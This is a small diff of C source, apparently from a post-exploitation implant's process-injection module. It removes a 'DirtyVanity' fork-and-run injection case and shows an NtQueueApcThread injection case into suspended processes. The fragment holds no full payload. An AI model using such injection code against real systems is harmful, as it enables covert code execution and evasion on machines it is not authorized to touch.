@@ -110,14 +110,6 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 					return TRUE;
 				break;
 #endif
-			/* 4.12 DirtyVanity fork&run trigger: reflect our own process;
-			 * the clone inherits this mirrored payload and its initial
-			 * thread starts at the entry (see inject_tier2.cpp) */
-			case PI_EXEC_DIRTYVANITY:
-				if (inject_via_dirtyvanity_reflect(context, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
 			/* try NtQueueApcThread against a suspended process */
 			case PI_EXEC_NTQUEUEAPCTHREAD_S:
 				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
